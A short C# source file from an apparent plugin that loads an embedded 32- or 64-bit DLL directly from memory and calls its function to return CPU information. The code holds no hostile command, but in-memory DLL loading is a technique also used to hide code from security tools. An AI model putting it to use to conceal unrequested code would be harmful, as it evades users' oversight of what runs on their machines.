using Plugin.Properties;
using System;
using System.Runtime.InteropServices;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class HardwareInformation
    {

        internal delegate IntPtr CPU();
        internal static string CPUInformation() 
        {
            DLLFromMemory cpuInfo;
            if(IntPtr.Size == 4)
                cpuInfo = new DLLFromMemory(Resources.CPU);
            else
                cpuInfo = new DLLFromMemory(Resources.CPU64);

            CPU C = (CPU)cpuInfo.GetDelegateFromFuncName("CpuInformation", typeof(CPU));
            return Marshal.PtrToStringUni(C());
        }
    }
}
